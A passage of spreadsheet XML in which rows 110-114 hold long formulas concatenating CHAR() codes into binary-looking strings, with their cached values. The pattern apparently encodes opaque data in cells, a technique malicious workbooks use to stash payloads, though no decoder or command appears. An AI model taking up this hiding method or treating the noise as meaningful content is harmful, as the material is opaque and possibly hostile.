p;CHAR(9)&amp;CHAR(27)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(49)&amp;CHAR(231)&amp;CHAR(135)&amp;CHAR(194)&amp;CHAR(113)&amp;CHAR(109)&amp;CHAR(85)&amp;CHAR(84)&amp;CHAR(107)&amp;CHAR(14)&amp;CHAR(252)&amp;CHAR(80)&amp;CHAR(89)&amp;CHAR(134)&amp;CHAR(237)&amp;CHAR(142)&amp;CHAR(230)&amp;CHAR(117)&amp;CHAR(108)&amp;CHAR(134)&amp;CHAR(161)&amp;CHAR(39)&amp;CHAR(134)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(134)&amp;CHAR(187)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(116)&amp;CHAR(66)&amp;CHAR(34)&amp;CHAR(198)&amp;CHAR(195)&amp;CHAR(231)&amp;CHAR(3)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(11)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(204)&amp;CHAR(83)&amp;CHAR(244)&amp;CHAR(89)&amp;CHAR(118)&amp;CHAR(104)&amp;CHAR(5)&amp;CHAR(136)&amp;CHAR(64)&amp;CHAR(45)&amp;CHAR(82)&amp;CHAR(93)&amp;CHAR(114)&amp;CHAR(141)&amp;CHAR(65)&amp;CHAR(47)&amp;CHAR(74)&amp;CHAR(135)&amp;CHAR(79)&amp;CHAR(49)&amp;CHAR(77)&amp;CHAR(82)&amp;CHAR(132)&amp;CHAR(131)&amp;CHAR(34)&amp;CHAR(137)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(82)&amp;CHAR(95)&amp;CHAR(253)&amp;CHAR(81)&amp;CHAR(101)&amp;CHAR(136)&amp;CHAR(253)&amp;CHAR(132)&amp;CHAR(254)&amp;CHAR(123)&amp;CHAR(5)&amp;CHAR(86)&amp;CHAR(250)&amp;CHAR(94)&amp;CHAR(97)&amp;CHAR(56)&amp;CHAR(230)&amp;CHAR(138)&amp;CHAR(137)&amp;CHAR(33)&amp;CHAR(133)&amp;CHAR(3)&amp;CHAR(6)&amp;CHAR(12)&amp;CHAR(69)&amp;CHAR(143)&amp;CHAR(134)&amp;CHAR(33)&amp;CHAR(133)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(57)&amp;CHAR(130)&amp;CHAR(6)&amp;CHAR(26)&amp;CHAR(17)&amp;CHAR(6)&amp;CHAR(112)&amp;CHAR(181)&amp;CHAR(143)&amp;CHAR(248)&amp;CHAR(125)&amp;CHAR(63)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(34)&amp;CHAR(34)&amp;CHAR(142)&amp;CHAR(95)&amp;CHAR(46)&amp;CHAR(106)&amp;CHAR(80)&amp;CHAR(88)&amp;CHAR(130)&amp;CHAR(232)&amp;CHAR(25)&amp;CHAR(135)&amp;CHAR(113)&amp;CHAR(48)&amp;CHAR(80)&amp;CHAR(142)&amp;CHAR(11)&amp;CHAR(141)&amp;CHAR(246)&amp;CHAR(97)&amp;CHAR(21)&amp;CHAR(138)&amp;CHAR(10)&amp;CHAR(172)&amp;CHAR(111)&amp;CHAR(30)&amp;CHAR(12)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(160)&amp;CHAR(167)&amp;CHAR(175)&amp;CHAR(137)&amp;CHAR(118)&amp;CHAR(33)&amp;CHAR(63)&amp;CHAR(83)&amp;CHAR(81)&amp;CHAR(254)&amp;CHAR(147)&amp;CHAR(231)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(128)&amp;CHAR(230)&amp;CHAR(127)&amp;CHAR(5)&amp;CHAR(88)&amp;CHAR(250)&amp;CHAR(86)&amp;CHAR(103)&amp;CHAR(141)&amp;CHAR(96)&amp;CHAR(33)&amp;CHAR(30)&amp;CHAR(233)&amp;CHAR(13)&amp;CHAR(142)&amp;CHAR(105)&amp;CHAR(45)&amp;CHAR(18)&amp;CHAR(137)&amp;CHAR(112)&amp;CHAR(38)&amp;CHAR(14)&amp;CHAR(71)&amp;CHAR(249)&amp;CHAR(81)&amp;CHAR(115)&amp;CHAR(95)&amp;CHAR(248)&amp;CHAR(86)&amp;CHAR(119)&amp;CHAR(55)&amp;CHAR(197)&amp;CHAR(70)&amp;CHAR(85)&amp;CHAR(93)</f>
        <v>v…A"_x001E_€Å
ã_x0002__x0004__x0002_™"†_x0007_
_x0007_ŽR_x0010_ˆG_x0012_S^X_x0008_„E =õTPýŽù_x0005_ƒ«_x0001__x0002_	Œ€	_x001B__x0001__x0005_1ç‡ÂqmUTk_x000E_üPY†íŽæul†¡'†_x000C__x0005__x0006__x0002_†»_x0001__x0001_
_x0002__x0004_tB"ÆÃç_x0003__x0002__x000D__x000B__x0004__x0005__x0005_ÌSôYvh_x0005_ˆ@-R]rA/J‡O1MR„ƒ"‰_x0013__x0001__x0005_R_ýQeˆý„þ{_x0005_Vú^a8æŠ‰!…_x0003__x0006__x000C_E†!…_x0005_	
9‚_x0006__x001A__x0011__x0006_pµø}?A""Ž_.jPX‚è_x0019_‡q0PŽ_x000B_öa_x0015_Š
¬o_x001E__x000C__x0013__x0001_ §¯‰v!?SQþ“ç_x0003__x0005__x000D_€æ_x0005_XúVg`!_x001E_é_x000D_Ži-_x0012_‰p&amp;_x000E_GùQs_øVw7ÅFU]</v>
      </c>
      <c r="C110" t="str">
        <f>CHAR(248)&amp;CHAR(121)&amp;CHAR(13)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(222)&amp;CHAR(163)&amp;CHAR(124)&amp;CHAR(233)</f>
        <v>øy_x000D_6ÍëÞ£|é</v>
      </c>
    </row>
    <row r="111" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B111" t="str">
        <f>CHAR(86)&amp;CHAR(81)&amp;CHAR(133)&amp;CHAR(198)&amp;CHAR(97)&amp;CHAR(194)&amp;CHAR(133)&amp;CHAR(229)&amp;CHAR(214)&amp;CHAR(5)&amp;CHAR(20)&amp;CHAR(4)&amp;CHAR(189)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(67)&amp;CHAR(210)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(41)&amp;CHAR(54)&amp;CHAR(198)&amp;CHAR(69)&amp;CHAR(106)&amp;CHAR(82)&amp;CHAR(80)&amp;CHAR(137)&amp;CHAR(166)&amp;CHAR(38)&amp;CHAR(234)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(136)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(79)&amp;CHAR(138)&amp;CHAR(65)&amp;CHAR(41)&amp;CHAR(81)&amp;CHAR(130)&amp;CHAR(79)&amp;CHAR(37)&amp;CHAR(81)&amp;CHAR(134)&amp;CHAR(184)&amp;CHAR(15)&amp;CHAR(3)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(139)&amp;CHAR(65)&amp;CHAR(33)&amp;CHAR(97)&amp;CHAR(128)&amp;CHAR(78)&amp;CHAR(38)&amp;CHAR(104)&amp;CHAR(139)&amp;CHAR(150)&amp;CHAR(53)&amp;CHAR(174)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(142)&amp;CHAR(129)&amp;CHAR(39)&amp;CHAR(196)&amp;CHAR(5)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(138)&amp;CHAR(143)&amp;CHAR(46)&amp;CHAR(206)&amp;CHAR(2)&amp;CHAR(13)&amp;CHAR(1)&amp;CHAR(141)&amp;CHAR(141)&amp;CHAR(46)&amp;CHAR(213)&amp;CHAR(20)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(130)&amp;CHAR(130)&amp;CHAR(46)&amp;CHAR(211)&amp;CHAR(21)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(132)&amp;CHAR(130)&amp;CHAR(78)&amp;CHAR(10)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(82)&amp;CHAR(197)&amp;CHAR(78)&amp;CHAR(38)&amp;CHAR(50)&amp;CHAR(30)&amp;CHAR(136)&amp;CHAR(65)&amp;CHAR(37)&amp;CHAR(198)&amp;CHAR(70)&amp;CHAR(39)&amp;CHAR(55)&amp;CHAR(1)&amp;CHAR(134)&amp;CHAR(73)&amp;CHAR(47)&amp;CHAR(204)&amp;CHAR(69)&amp;CHAR(41)&amp;CHAR(61)&amp;CHAR(13)&amp;CHAR(136)&amp;CHAR(82)&amp;CHAR(40)&amp;CHAR(194)&amp;CHAR(66)&amp;CHAR(38)&amp;CHAR(57)&amp;CHAR(9)&amp;CHAR(87)&amp;CHAR(136)&amp;CHAR(200)&amp;CHAR(197)&amp;CHAR(64)&amp;CHAR(38)&amp;CHAR(82)&amp;CHAR(17)&amp;CHAR(4)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(205)&amp;CHAR(67)&amp;CHAR(33)&amp;CHAR(71)&amp;CHAR(135)&amp;CHAR(236)&amp;CHAR(7)&amp;CHAR(127)&amp;CHAR(196)&amp;CHAR(79)&amp;CHAR(46)&amp;CHAR(78)&amp;CHAR(246)&amp;CHAR(242)&amp;CHAR(209)&amp;CHAR(199)&amp;CHAR(206)&amp;CHAR(78)&amp;CHAR(33)&amp;CHAR(88)&amp;CHAR(76)&amp;CHAR(132)&amp;CHAR(231)&amp;CHAR(78)&amp;CHAR(205)&amp;CHAR(79)&amp;CHAR(49)&amp;CHAR(85)&amp;CHAR(139)&amp;CHAR(165)&amp;CHAR(35)&amp;CHAR(54)&amp;CHAR(202)&amp;CHAR(87)&amp;CHAR(37)&amp;CHAR(89)&amp;CHAR(139)&amp;CHAR(150)&amp;CHAR(38)&amp;CHAR(58)&amp;CHAR(194)&amp;CHAR(71)&amp;CHAR(33)&amp;CHAR(101)&amp;CHAR(136)&amp;CHAR(190)&amp;CHAR(39)&amp;CHAR(35)&amp;CHAR(194)&amp;CHAR(73)&amp;CHAR(33)&amp;CHAR(103)&amp;CHAR(130)&amp;CHAR(181)&amp;CHAR(41)&amp;CHAR(45)&amp;CHAR(194)&amp;CHAR(71)&amp;CHAR(34)&amp;CHAR(120)&amp;CHAR(140)&amp;CHAR(224)&amp;CHAR(74)&amp;CHAR(140)&amp;CHAR(194)&amp;CHAR(65)&amp;CHAR(45)&amp;CHAR(114)&amp;CHAR(205)&amp;CHAR(188)&amp;CHAR(2)&amp;CHAR(16)&amp;CHAR(214)&amp;CHAR(66)&amp;CHAR(38)&amp;CHAR(123)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(73)&amp;CHAR(138)&amp;CHAR(195)&amp;CHAR(129)&amp;CHAR(34)&amp;CHAR(138)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(199)&amp;CHAR(74)&amp;CHAR(128)&amp;CHAR(21)&amp;CHAR(195)&amp;CHAR(141)&amp;CHAR(46)&amp;CHAR(129)&amp;CHAR(20)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(74)&amp;CHAR(135)&amp;CHAR(15)&amp;CHAR(210)&amp;CHAR(133)&amp;CHAR(38)&amp;CHAR(129)&amp;CHAR(7)&amp;CHAR(6)&amp;CHAR(13)&amp;CHAR(17)&amp;CHAR(76)&amp;CHAR(136)</f>
        <v>VQ…ÆaÂ…åÖ_x0005__x0014__x0004_½
_x0006_
CÒE&amp;)6ÆEjRP‰¦&amp;ê_x0005__x0003__x0005_ˆE&amp;OŠA)Q‚O%Q†¸_x000F__x0003__x000C__x0005__x0007_‹A!a€N&amp;h‹–5®_x0002__x0007_
Ž'Ä_x0005__x0006_
Š.Î_x0002__x000D__x0001_.Õ_x0014__x0004__x0005_‚‚.Ó_x0015__x0001__x0002_„‚N
_x0013__x0001_RÅN&amp;2_x001E_ˆA%ÆF'7_x0001_†I/ÌE)=_x000D_ˆR(ÂB&amp;9	WˆÈÅ@&amp;R_x0011__x0004__x0002__x0007_ÍC!G‡ì_x0007_ÄO.NöòÑÇÎN!XL„çNÍO1U‹¥#6ÊW%Y‹–&amp;:ÂG!eˆ¾'#ÂI!g‚µ)-ÂG"xŒàJŒÂA-rÍ¼_x0002__x0010_ÖB&amp;{
_x0007_IŠÃ"Š_x0003__x000B_
ÇJ€_x0015_Ã._x0014__x0004__x0005_
J‡_x000F_Ò…&amp;_x0007__x0006__x000D__x0011_Lˆ</v>
      </c>
      <c r="C111" t="str">
        <f>CHAR(209)&amp;CHAR(30)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(163)&amp;CHAR(126)&amp;CHAR(127)&amp;CHAR(236)&amp;CHAR(55)</f>
        <v>Ñ_x001E_Íë»£~ì7</v>
      </c>
    </row>
    <row r="112" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B112" t="str">
        <f>CHAR(14)&amp;CHAR(205)&amp;CHAR(134)&amp;CHAR(38)&amp;CHAR(137)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(75)&amp;CHAR(142)&amp;CHAR(31)&amp;CHAR(194)&amp;CHAR(137)&amp;CHAR(33)&amp;CHAR(155)&amp;CHAR(11)&amp;CHAR(1)&amp;CHAR(13)&amp;CHAR(4)&amp;CHAR(77)&amp;CHAR(138)&amp;CHAR(154)&amp;CHAR(203)&amp;CHAR(129)&amp;CHAR(34)&amp;CHAR(150)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(45)&amp;CHAR(10)&amp;CHAR(3)&amp;CHAR(4)&amp;CHAR(197)&amp;CHAR(150)&amp;CHAR(53)&amp;CHAR(158)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(77)&amp;CHAR(2)&amp;CHAR(199)&amp;CHAR(194)&amp;CHAR(130)&amp;CHAR(46)&amp;CHAR(159)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(74)&amp;CHAR(132)&amp;CHAR(157)&amp;CHAR(32)&amp;CHAR(206)&amp;CHAR(142)&amp;CHAR(33)&amp;CHAR(180)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(14)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(21)&amp;CHAR(198)&amp;CHAR(134)&amp;CHAR(45)&amp;CHAR(163)&amp;CHAR(6)&amp;CHAR(13)&amp;CHAR(19)&amp;CHAR(73)&amp;CHAR(4)&amp;CHAR(193)&amp;CHAR(66)&amp;CHAR(197)&amp;CHAR(134)&amp;CHAR(33)&amp;CHAR(171)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(139)&amp;CHAR(159)&amp;CHAR(39)&amp;CHAR(21)&amp;CHAR(202)&amp;CHAR(129)&amp;CHAR(47)&amp;CHAR(187)&amp;CHAR(1)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(4)&amp;CHAR(192)&amp;CHAR(78)&amp;CHAR(133)&amp;CHAR(194)&amp;CHAR(130)&amp;CHAR(38)&amp;CHAR(177)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(150)&amp;CHAR(38)&amp;CHAR(28)&amp;CHAR(3)&amp;CHAR(213)&amp;CHAR(149)&amp;CHAR(34)&amp;CHAR(186)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(251)&amp;CHAR(210)&amp;CHAR(193)&amp;CHAR(142)&amp;CHAR(39)&amp;CHAR(183)&amp;CHAR(10)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(69)&amp;CHAR(136)&amp;CHAR(240)&amp;CHAR(65)&amp;CHAR(205)&amp;CHAR(129)&amp;CHAR(48)&amp;CHAR(196)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(129)&amp;CHAR(191)&amp;CHAR(49)&amp;CHAR(41)&amp;CHAR(197)&amp;CHAR(141)&amp;CHAR(35)&amp;CHAR(206)&amp;CHAR(13)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(142)&amp;CHAR(190)&amp;CHAR(46)&amp;CHAR(34)&amp;CHAR(197)&amp;CHAR(129)&amp;CHAR(39)&amp;CHAR(213)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(136)&amp;CHAR(159)&amp;CHAR(33)&amp;CHAR(53)&amp;CHAR(194)&amp;CHAR(143)&amp;CHAR(47)&amp;CHAR(217)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(5)&amp;CHAR(136)&amp;CHAR(170)&amp;CHAR(40)&amp;CHAR(53)&amp;CHAR(193)&amp;CHAR(134)&amp;CHAR(33)&amp;CHAR(229)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(131)&amp;CHAR(192)&amp;CHAR(74)&amp;CHAR(19)&amp;CHAR(214)&amp;CHAR(130)&amp;CHAR(38)&amp;CHAR(227)&amp;CHAR(10)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(4)&amp;CHAR(198)&amp;CHAR(6)&amp;CHAR(131)&amp;CHAR(71)&amp;CHAR(47)&amp;CHAR(30)&amp;CHAR(114)&amp;CHAR(4)&amp;CHAR(134)&amp;CHAR(1)&amp;CHAR(141)&amp;CHAR(77)&amp;CHAR(46)&amp;CHAR(17)&amp;CHAR(159)&amp;CHAR(188)&amp;CHAR(81)&amp;CHAR(18)&amp;CHAR(6)&amp;CHAR(10)&amp;CHAR(14)&amp;CHAR(13)&amp;CHAR(24)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(4)&amp;CHAR(254)&amp;CHAR(132)&amp;CHAR(87)&amp;CHAR(37)&amp;CHAR(21)&amp;CHAR(49)&amp;CHAR(209)&amp;CHAR(139)&amp;CHAR(126)&amp;CHAR(33)&amp;CHAR(27)&amp;CHAR(86)&amp;CHAR(254)&amp;CHAR(84)&amp;CHAR(58)&amp;CHAR(101)&amp;CHAR(136)&amp;CHAR(74)&amp;CHAR(9)&amp;CHAR(140)&amp;CHAR(79)&amp;CHAR(47)&amp;CHAR(41)&amp;CHAR(134)&amp;CHAR(85)&amp;CHAR(57)&amp;CHAR(101)&amp;CHAR(61)&amp;CHAR(64)&amp;CHAR(7)&amp;CHAR(2)&amp;CHAR(13)</f>
        <v>_x000E_Í†&amp;‰_x0003__x0005__x0001__x0001_KŽ_x001F_Â‰!›_x000B__x0001__x000D__x0004_MŠšË"–_x0005__x0005__x0005_-
_x0003__x0004_Å–5ž_x0002__x0007_
_x0007_M_x0002_ÇÂ‚.Ÿ_x000B_
_x0006_J„ ÎŽ!´_x0004__x0005__x000B__x000E__x000B__x000B__x0015_Æ†-£_x0006__x000D__x0013_I_x0004_ÁBÅ†!«_x0005__x0001__x0001_‹Ÿ'_x0015_Ê/»_x0001__x000D__x0005__x0004_ÀN…Â‚&amp;±_x0005__x0005_	–&amp;_x001C__x0003_Õ•"º_x0007_
_x0007__x0005__x0003_ûÒÁŽ'·
_x0006__x0002_EˆðAÍ0Ä_x0005__x000B__x0006_¿1)Å#Î_x000D__x0013__x0001_Ž¾."Å'Õ_x0001__x0001__x0002_ˆŸ!5Â/Ù_x000D__x0005__x0005_ˆª(5Á†!å_x0005_	
ƒÀJ_x0013_Ö‚&amp;ã
_x0007__x0005__x0003__x0004_Æ_x0006_ƒG/_x001E_r_x0004_†_x0001_M._x0011_Ÿ¼Q_x0012__x0006_
_x000E__x000D__x0018__x0002_	_x0004_þ„W%_x0015_1Ñ‹~!_x001B_VþT:eˆJ	ŒO/)†U9e=@_x0007__x0002__x000D_</v>
      </c>
      <c r="C112" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(222)&amp;CHAR(163)&amp;CHAR(124)&amp;CHAR(249)&amp;CHAR(209)&amp;CHAR(30)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>ÍëÞ£|ùÑ_x001E_Íë</v>
      </c>
    </row>
    <row r="113" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B113" t="str">
        <f>CHAR(128)&amp;CHAR(133)&amp;CHAR(7)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(84)&amp;CHAR(110)&amp;CHAR(66)&amp;CHAR(170)&amp;CHAR(17)&amp;CHAR(54)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(179)&amp;CHAR(7)&amp;CHAR(21)&amp;CHAR(3)&amp;CHAR(4)&amp;CHAR(85)&amp;CHAR(143)&amp;CHAR(78)&amp;CHAR(39)&amp;CHAR(35)&amp;CHAR(129)&amp;CHAR(65)&amp;CHAR(82)&amp;CHAR(14)&amp;CHAR(192)&amp;CHAR(84)&amp;CHAR(90)&amp;CHAR(245)&amp;CHAR(80)&amp;CHAR(40)&amp;CHAR(143)&amp;CHAR(245)&amp;CHAR(142)&amp;CHAR(240)&amp;CHAR(5)&amp;CHAR(143)&amp;CHAR(76)&amp;CHAR(3)&amp;CHAR(2)&amp;CHAR(9)&amp;CHAR(8)&amp;CHAR(177)&amp;CHAR(82)&amp;CHAR(7)&amp;CHAR(50)&amp;CHAR(197)&amp;CHAR(129)&amp;CHAR(110)&amp;CHAR(38)&amp;CHAR(18)&amp;CHAR(5)&amp;CHAR(128)&amp;CHAR(198)&amp;CHAR(45)&amp;CHAR(103)&amp;CHAR(57)&amp;CHAR(68)&amp;CHAR(5)&amp;CHAR(118)&amp;CHAR(58)&amp;CHAR(142)&amp;CHAR(103)&amp;CHAR(47)&amp;CHAR(21)&amp;CHAR(14)&amp;CHAR(218)&amp;CHAR(250)&amp;CHAR(112)&amp;CHAR(250)&amp;CHAR(135)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(199)&amp;CHAR(85)&amp;CHAR(142)&amp;CHAR(70)&amp;CHAR(241)&amp;CHAR(9)&amp;CHAR(196)&amp;CHAR(84)&amp;CHAR(234)&amp;CHAR(179)&amp;CHAR(22)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(140)&amp;CHAR(70)&amp;CHAR(35)&amp;CHAR(25)&amp;CHAR(142)&amp;CHAR(95)&amp;CHAR(45)&amp;CHAR(9)&amp;CHAR(189)&amp;CHAR(68)&amp;CHAR(13)&amp;CHAR(137)&amp;CHAR(194)&amp;CHAR(14)&amp;CHAR(76)&amp;CHAR(136)&amp;CHAR(72)&amp;CHAR(45)&amp;CHAR(26)&amp;CHAR(62)&amp;CHAR(220)&amp;CHAR(118)&amp;CHAR(211)&amp;CHAR(128)&amp;CHAR(170)&amp;CHAR(46)&amp;CHAR(251)&amp;CHAR(21)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(130)&amp;CHAR(152)&amp;CHAR(134)&amp;CHAR(13)&amp;CHAR(19)&amp;CHAR(1)&amp;CHAR(6)&amp;CHAR(220)&amp;CHAR(131)&amp;CHAR(94)&amp;CHAR(38)&amp;CHAR(17)&amp;CHAR(136)&amp;CHAR(70)&amp;CHAR(13)&amp;CHAR(132)&amp;CHAR(194)&amp;CHAR(119)&amp;CHAR(107)&amp;CHAR(6)&amp;CHAR(203)&amp;CHAR(85)&amp;CHAR(244)&amp;CHAR(94)&amp;CHAR(49)&amp;CHAR(134)&amp;CHAR(86)&amp;CHAR(21)&amp;CHAR(138)&amp;CHAR(66)&amp;CHAR(40)&amp;CHAR(45)&amp;CHAR(5)&amp;CHAR(212)&amp;CHAR(142)&amp;CHAR(6)&amp;CHAR(6)&amp;CHAR(207)&amp;CHAR(131)&amp;CHAR(86)&amp;CHAR(32)&amp;CHAR(38)&amp;CHAR(155)&amp;CHAR(85)&amp;CHAR(34)&amp;CHAR(18)&amp;CHAR(140)&amp;CHAR(2)&amp;CHAR(130)&amp;CHAR(204)&amp;CHAR(119)&amp;CHAR(49)&amp;CHAR(142)&amp;CHAR(90)&amp;CHAR(46)&amp;CHAR(43)&amp;CHAR(128)&amp;CHAR(240)&amp;CHAR(141)&amp;CHAR(87)&amp;CHAR(57)&amp;CHAR(132)&amp;CHAR(205)&amp;CHAR(112)&amp;CHAR(15)&amp;CHAR(10)&amp;CHAR(163)&amp;CHAR(197)&amp;CHAR(238)&amp;CHAR(14)&amp;CHAR(139)&amp;CHAR(76)&amp;CHAR(9)&amp;CHAR(22)&amp;CHAR(192)&amp;CHAR(82)&amp;CHAR(90)&amp;CHAR(248)&amp;CHAR(212)&amp;CHAR(132)&amp;CHAR(20)&amp;CHAR(130)&amp;CHAR(194)&amp;CHAR(6)&amp;CHAR(129)&amp;CHAR(70)&amp;CHAR(38)&amp;CHAR(21)&amp;CHAR(128)&amp;CHAR(197)&amp;CHAR(5)&amp;CHAR(136)&amp;CHAR(70)&amp;CHAR(39)&amp;CHAR(19)&amp;CHAR(142)&amp;CHAR(5)&amp;CHAR(128)&amp;CHAR(194)&amp;CHAR(126)&amp;CHAR(212)&amp;CHAR(134)&amp;CHAR(89)&amp;CHAR(33)&amp;CHAR(23)&amp;CHAR(141)&amp;CHAR(79)&amp;CHAR(37)&amp;CHAR(133)&amp;CHAR(193)&amp;CHAR(17)&amp;CHAR(140)&amp;CHAR(89)&amp;CHAR(45)&amp;CHAR(30)&amp;CHAR(135)&amp;CHAR(196)&amp;CHAR(119)&amp;CHAR(142)&amp;CHAR(154)&amp;CHAR(122)&amp;CHAR(38)&amp;CHAR(27)&amp;CHAR(129)&amp;CHAR(152)&amp;CHAR(165)&amp;CHAR(3)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(141)&amp;CHAR(204)&amp;CHAR(40)&amp;CHAR(76)&amp;CHAR(62)&amp;CHAR(5)&amp;CHAR(220)&amp;CHAR(62)</f>
        <v>€…_x0007_	
TnBª_x0011_6_x0002__x0007_³_x0007__x0015__x0003__x0004_UN'#AR_x000E_ÀTZõP(õŽð_x0005_L_x0003__x0002_	_x0008_±R_x0007_2Ån&amp;_x0012__x0005_€Æ-g9D_x0005_v:Žg/_x0015__x000E_Úúpú‡_x0006__x0005_ÇUŽFñ	ÄTê³_x0016__x0006__x0002_ŒF#_x0019_Ž_-	½D_x000D_‰Â_x000E_LˆH-_x001A_&gt;ÜvÓ€ª.û_x0015__x0001__x0002_‚˜†_x000D__x0013__x0001__x0006_Üƒ^&amp;_x0011_ˆF_x000D_„Âwk_x0006_ËUô^1†V_x0015_ŠB(-_x0005_ÔŽ_x0006__x0006_ÏƒV &amp;›U"_x0012_Œ_x0002_‚Ìw1ŽZ.+€ðW9„Íp_x000F_
£Åî_x000E_‹L	_x0016_ÀRZøÔ„_x0014_‚Â_x0006_F&amp;_x0015_€Å_x0005_ˆF'_x0013_Ž_x0005_€Â~Ô†Y!_x0017_O%…Á_x0011_ŒY-_x001E_‡ÄwŽšz&amp;_x001B_˜¥_x0003__x0004__x0005_Ì(L&gt;_x0005_Ü&gt;</v>
      </c>
      <c r="C113" t="str">
        <f>CHAR(187)&amp;CHAR(163)&amp;CHAR(242)&amp;CHAR(109)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(163)&amp;CHAR(48)&amp;CHAR(235)</f>
        <v>»£òmô6Í£0ë</v>
      </c>
    </row>
    <row r="114" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B114" t="str">
        <f>CHAR(200)&amp;CHAR(141)&amp;CHAR(77)&amp;CHAR(46)&amp;CHAR(25)&amp;CHAR(45)&amp;CHAR(15)&amp;CHAR(113)&amp;CHAR(111)&amp;CHAR(139)&amp;CHAR(65)&amp;CHAR(3)&amp;CHAR(254)&amp;CHAR(72)&amp;CHAR(13)&amp;CHAR(190)&amp;CHAR(6)&amp;CHAR(141)&amp;CHAR(221)&amp;CHAR(54)&amp;CHAR(1)&amp;CHAR(245)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(139)&amp;CHAR(86)&amp;CHAR(33)&amp;CHAR(19)&amp;CHAR(99)&amp;CHAR(58)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(35)&amp;CHAR(118)&amp;CHAR(38)&amp;CHAR(134)&amp;CHAR(199)&amp;CHAR(46)&amp;CHAR(244)&amp;CHAR(14)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(140)&amp;CHAR(71)&amp;CHAR(34)&amp;CHAR(28)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(137)&amp;CHAR(9)&amp;CHAR(53)&amp;CHAR(6)&amp;CHAR(69)&amp;CHAR(46)&amp;CHAR(30)&amp;CHAR(143)&amp;CHAR(70)&amp;CHAR(54)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(142)&amp;CHAR(6)&amp;CHAR(55)&amp;CHAR(142)&amp;CHAR(79)&amp;CHAR(32)&amp;CHAR(17)&amp;CHAR(237)&amp;CHAR(4)&amp;CHAR(187)&amp;CHAR(11)&amp;CHAR(26)&amp;CHAR(6)&amp;CHAR(2)&amp;CHAR(107)&amp;CHAR(58)&amp;CHAR(212)&amp;CHAR(6)&amp;CHAR(137)&amp;CHAR(32)&amp;CHAR(21)&amp;CHAR(4)&amp;CHAR(5)&amp;CHAR(136)&amp;CHAR(199)&amp;CHAR(8)&amp;CHAR(128)&amp;CHAR(86)&amp;CHAR(5)&amp;CHAR(1)&amp;CHAR(202)&amp;CHAR(142)&amp;CHAR(74)&amp;CHAR(41)&amp;CHAR(7)&amp;CHAR(58)&amp;CHAR(205)&amp;CHAR(119)&amp;CHAR(160)&amp;CHAR(129)&amp;CHAR(59)&amp;CHAR(5)&amp;CHAR(136)&amp;CHAR(220)&amp;CHAR